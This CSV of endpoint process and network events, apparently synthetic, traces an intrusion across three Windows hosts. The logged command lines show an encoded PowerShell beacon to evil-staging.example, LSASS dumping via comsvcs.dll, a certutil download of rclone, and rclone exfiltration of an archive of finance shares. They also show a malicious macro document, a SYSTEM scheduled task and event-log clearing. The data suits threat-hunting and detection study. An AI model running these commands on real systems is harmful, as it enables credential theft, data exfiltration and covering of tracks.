Timestamp,DeviceName,ActionType,FileName,FolderPath,ProcessCommandLine,SHA256,AccountName,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,ProcessId,RemoteIP,RemoteUrl,RemotePort,ReportId
2026-05-20T09:19:23Z,WS-MARKETING-08,ProcessCreated,mstsc.exe,C:\Windows\System32,mstsc.exe /v:WS-FINANCE-04,11EE22FF33AA11EE22FF33AA11EE22FF33AA11EE22FF33AA11EE22FF33AA11EE,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4252,,,,1045
2026-05-20T09:19:31Z,WS-MARKETING-08,NetworkConnectionEvents,mstsc.exe,C:\Windows\System32,mstsc.exe /v:WS-FINANCE-04,11EE22FF33AA11EE22FF33AA11EE22FF33AA11EE22FF33AA11EE22FF33AA11EE,jbecker,mstsc.exe,mstsc.exe /v:WS-FINANCE-04,4252,jbecker,4252,10.50.5.18,ws-finance-04.corp.local,3389,1046
2026-05-20T09:19:41Z,WS-MARKETING-08,ProcessCreated,sc.exe,C:\Windows\System32,"sc.exe \\SRV-FILES-01 create RemoteUpdate binPath= ""C:\Windows\Temp\update.exe"" start= auto",66FF77AA88BB66FF77AA88BB66FF77AA88BB66FF77AA88BB66FF77AA88BB66FF,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4259,,,,1047
2026-05-20T09:22:41Z,WS-MARKETING-08,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,198.51.100.42,evil-staging.example,443,1048
2026-05-20T09:25:41Z,WS-MARKETING-08,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,198.51.100.42,evil-staging.example,443,1049
2026-05-20T09:28:41Z,WS-MARKETING-08,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,198.51.100.42,evil-staging.example,443,1050
2026-05-20T09:31:41Z,WS-MARKETING-08,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,198.51.100.42,evil-staging.example,443,1051
2026-05-20T09:32:41Z,SRV-FILES-01,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,svc-backup,wsmprovhost.exe,wsmprovhost.exe -Embedding,5512,svc-backup,4266,,,,1052
2026-05-20T09:32:53Z,SRV-FILES-01,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4266,198.51.100.42,evil-staging.example,443,1053
2026-05-20T09:33:03Z,SRV-FILES-01,ProcessCreated,whoami.exe,C:\Windows\System32,whoami.exe /all,11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4273,,,,1054
2026-05-20T09:33:13Z,SRV-FILES-01,ProcessCreated,hostname.exe,C:\Windows\System32,hostname.exe,55CC66DD77EE55CC66DD77EE55CC66DD77EE55CC66DD77EE55CC66DD77EE55CC,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4280,,,,1055
2026-05-20T09:33:23Z,SRV-FILES-01,ProcessCreated,net.exe,C:\Windows\System32,net.exe localgroup administrators,A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4287,,,,1056
2026-05-20T09:33:33Z,SRV-FILES-01,ProcessCreated,nltest.exe,C:\Windows\System32,nltest.exe /dclist:corp.local,F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4294,,,,1057
2026-05-20T09:33:43Z,SRV-FILES-01,ProcessCreated,dsquery.exe,C:\Windows\System32,dsquery.exe user -limit 10000,44BB55CC66DD44BB55CC66DD44BB55CC66DD44BB55CC66DD44BB55CC66DD44BB,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4301,,,,1058
2026-05-20T09:34:05Z,SRV-FILES-01,ProcessCreated,rundll32.exe,C:\Windows\System32,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 712 C:\Windows\Temp\srv-out.bin full,B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4308,,,,1059
2026-05-20T09:34:13Z,SRV-FILES-01,FileCreated,srv-out.bin,C:\Windows\Temp,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 712 C:\Windows\Temp\srv-out.bin full,C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2E3F4A5B6C1D2,svc-backup,rundll32.exe,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump,4308,svc-backup,4308,,,,1060
2026-05-20T09:36:13Z,SRV-FILES-01,ProcessCreated,certutil.exe,C:\Windows\System32,certutil.exe -urlcache -split -f https://203.0.113.55/tools/rclone.exe C:\Windows\Temp\rclone.exe,E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4315,,,,1061
2026-05-20T09:36:21Z,SRV-FILES-01,NetworkConnectionEvents,certutil.exe,C:\Windows\System32,certutil.exe -urlcache -split -f https://203.0.113.55/tools/rclone.exe,E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6A7B8C9D0E5F6,svc-backup,certutil.exe,certutil.exe -urlcache -split -f https://203.0.113.55/tools/rclone.exe,4315,svc-backup,4315,203.0.113.55,https://203.0.113.55/tools/rclone.exe,443,1062
2026-05-20T09:36:35Z,SRV-FILES-01,FileCreated,rclone.exe,C:\Windows\Temp,certutil.exe -urlcache,99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA,svc-backup,certutil.exe,certutil.exe -urlcache -split -f,4315,svc-backup,4315,,,,1063
2026-05-20T09:36:53Z,SRV-FILES-01,ProcessCreated,7z.exe,C:\Windows\Temp,"7z.exe a -p""Pa$$w0rd!"" -mhe=on C:\Windows\Temp\stg.7z C:\Users\jbecker\Documents\* C:\Shares\Finance\*",88BB99CC00DD88BB99CC00DD88BB99CC00DD88BB99CC00DD88BB99CC00DD88BB,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4322,,,,1064
2026-05-20T09:39:53Z,SRV-FILES-01,FileCreated,stg.7z,C:\Windows\Temp,"7z.exe a -p""Pa$$w0rd!"" -mhe=on C:\Windows\Temp\stg.7z",88BB99CC00DD88BB99CC00DD88BB99CC00DD88BB99CC00DD88BB99CC00DD88BB,svc-backup,7z.exe,"7z.exe a -p""Pa$$w0rd!"" -mhe=on",4322,svc-backup,4322,,,,1065
2026-05-20T09:40:13Z,SRV-FILES-01,ProcessCreated,rclone.exe,C:\Windows\Temp,rclone.exe copy C:\Windows\Temp\stg.7z remote:bucket --http-url=http://192.0.2.99/upload,99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4329,,,,1066
2026-05-20T09:40:43Z,SRV-FILES-01,NetworkConnectionEvents,rclone.exe,C:\Windows\Temp,rclone.exe copy C:\Windows\Temp\stg.7z remote:bucket,99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA,svc-backup,rclone.exe,rclone.exe copy,4329,svc-backup,4329,192.0.2.99,http://192.0.2.99/upload,80,1067
2026-05-20T09:41:13Z,SRV-FILES-01,NetworkConnectionEvents,rclone.exe,C:\Windows\Temp,rclone.exe copy C:\Windows\Temp\stg.7z remote:bucket,99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA,svc-backup,rclone.exe,rclone.exe copy,4329,svc-backup,4329,192.0.2.99,http://192.0.2.99/upload,80,1068
2026-05-20T09:41:43Z,SRV-FILES-01,NetworkConnectionEvents,rclone.exe,C:\Windows\Temp,rclone.exe copy C:\Windows\Temp\stg.7z remote:bucket,99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA00BB11CC99AA,svc-backup,rclone.exe,rclone.exe copy,4329,svc-backup,4329,192.0.2.99,http://192.0.2.99/upload,80,1069
2026-05-20T09:42:43Z,SRV-FILES-01,ProcessCreated,wevtutil.exe,C:\Windows\System32,wevtutil.exe cl Application,77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4336,,,,1070
2026-05-20T09:42:49Z,SRV-FILES-01,ProcessCreated,wevtutil.exe,C:\Windows\System32,wevtutil.exe cl System,77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4343,,,,1071
2026-05-20T09:42:57Z,SRV-FILES-01,ProcessCreated,cmd.exe,C:\Windows\System32,cmd.exe /c del /q /f C:\Windows\Temp\*.7z C:\Windows\Temp\out.bin C:\Windows\Temp\srv-out.bin C:\Users\jbecker\AppData\Local\Temp\out.bin,E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4,svc-backup,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4266,svc-backup,4350,,,,1072
2026-05-20T09:43:57Z,WS-MARKETING-08,ProcessCreated,wevtutil.exe,C:\Windows\System32,wevtutil.exe cl Application,77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4357,,,,1073
2026-05-20T09:44:03Z,WS-MARKETING-08,ProcessCreated,wevtutil.exe,C:\Windows\System32,wevtutil.exe cl System,77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA88BB99CC77AA,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4364,,,,1074
2026-05-20T09:44:11Z,WS-MARKETING-08,ProcessCreated,cmd.exe,C:\Windows\System32,cmd.exe /c del /q /f C:\Windows\Temp\*.7z C:\Windows\Temp\out.bin C:\Windows\Temp\srv-out.bin C:\Users\jbecker\AppData\Local\Temp\out.bin,E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4371,,,,1075
2026-05-20T11:42:08Z,WS-LEGAL-12,ProcessCreated,OUTLOOK.EXE,C:\Program Files\Microsoft Office\root\Office16,OUTLOOK.EXE /recycle,0011223344550011223344550011223344550011223344550011223344550011,smith,explorer.exe,C:\Windows\explorer.exe,3018,smith,4378,,,,1076
2026-05-20T11:46:08Z,WS-LEGAL-12,ProcessCreated,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,"WINWORD.EXE /n ""C:\Users\smith\Downloads\Contract_Review.docm""",B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8,smith,OUTLOOK.EXE,OUTLOOK.EXE /recycle,4378,smith,4385,,,,1077
2026-05-20T11:46:46Z,WS-LEGAL-12,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,smith,WINWORD.EXE,"WINWORD.EXE /n ""C:\Users\smith\Downloads\Contract_Review.docm""",4385,smith,4392,,,,1078
2026-05-20T11:46:58Z,WS-LEGAL-12,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4392,198.51.100.42,evil-staging.example,443,1079
2026-05-20T11:47:18Z,WS-LEGAL-12,ProcessCreated,whoami.exe,C:\Windows\System32,whoami.exe /all,11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA22BB33CC11AA,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4399,,,,1080
2026-05-20T11:47:38Z,WS-LEGAL-12,ProcessCreated,nltest.exe,C:\Windows\System32,nltest.exe /domain_trusts,F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6B7C8D9E0F5A6,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4406,,,,1081
2026-05-20T11:47:58Z,WS-LEGAL-12,ProcessCreated,net.exe,C:\Windows\System32,"net.exe group ""Domain Admins"" /domain",A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8C9D0E1F2A7B8,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4413,,,,1082
2026-05-20T11:48:18Z,WS-LEGAL-12,ProcessCreated,rundll32.exe,C:\Windows\System32,rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 716 C:\Users\smith\AppData\Local\Temp\out.bin full,B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0D1E2F3A4B9C0,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4420,,,,1083
2026-05-20T11:48:38Z,WS-LEGAL-12,ProcessCreated,schtasks.exe,C:\Windows\System32,"schtasks.exe /create /tn ""WindowsUpdateCheck"" /tr ""C:\Users\smith\AppData\Local\Temp\s2.ps1"" /sc onlogon /ru SYSTEM /f",D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4F5A6B7C8D3E4,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4427,,,,1084
2026-05-20T11:52:38Z,WS-LEGAL-12,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4392,198.51.100.42,evil-staging.example,443,1085
2026-05-20T11:56:38Z,WS-LEGAL-12,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4392,198.51.100.42,evil-staging.example,443,1086
2026-05-20T12:00:38Z,WS-LEGAL-12,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,smith,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4392,smith,4392,198.51.100.42,evil-staging.example,443,1087
